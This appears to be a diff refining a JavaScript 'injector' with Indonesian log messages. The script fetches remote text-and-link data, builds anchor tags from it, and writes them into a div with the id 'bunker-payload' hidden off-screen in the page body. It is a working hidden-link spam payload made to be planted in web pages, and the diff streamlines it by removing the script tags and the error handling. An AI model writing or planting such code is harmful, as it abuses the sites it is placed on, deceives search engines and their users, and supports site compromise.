@@ -1,4 +1,3 @@
-<script>
 !function(){
 try{
   if(document.getElementById("bunker-payload")) return;
@@ -16,6 +15,7 @@ try{
       return "";
     }
   };
+
   async function getData(id){
     try{
       const res = await fetch(
@@ -46,6 +46,7 @@ try{
       console.warn("Data kosong, inject dibatalkan");
       return;
     }
+
     const anchors = anchorsRaw
       .split("\n")
       .map(x => x.trim())
@@ -53,41 +54,29 @@ try{
       .map(line => {
         const parts = line.split("|");
         if(parts.length < 2) return "";
-        const text = parts[0].trim();
-        const href = parts[1].trim();
-        if(!text || !href) return "";
-        return `<a href="${href}">${text}</a>`;
+        return `<a href="${parts[1].trim()}">${parts[0].trim()}</a>`;
       })
       .filter(Boolean);
-
-    console.log("Anchors parsed:", anchors.length);
 
     let i = 0;
     const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
       return anchors.length ? anchors[i++ % anchors.length] : "";
     });
+
     function inject(){
-      try{
-        if(document.getElementById("bunker-payload")) return;
+      if(document.getElementById("bunker-payload")) return;
 
-        const box = document.createElement("div");
-        box.id = "bunker-payload";
-        box.style.position = "absolute";
-        box.style.left = "-9999px";
-        box.style.top = "0";
-        box.style.width = "1px";
-        box.style.height = "1px";
-        box.style.overflow = "hidden";
-        box.innerHTML = html;
+      const box = document.createElement("div");
+      box.id = "bunker-payload";
+      box.style.position = "absolute";
+      box.style.left = "-9999px";
+      box.innerHTML = html;
 
-        document.body.appendChild(box);
-        console.log("Inject sukses");
-
-      }catch(e){
-        console.error("Inject error:", e);
-      }
+      document.body.appendChild(box);
+      console.log("Inject sukses");
     }
-    if(document.readyState === "complete" || document.readyState === "interactive"){
+
+    if(document.readyState !== "loading"){
       inject();
     }else{
       document.addEventListener("DOMContentLoaded", inject);
@@ -99,4 +88,3 @@ try{
   console.error("Injector fatal error:", e);
 }
 }();
-</script>
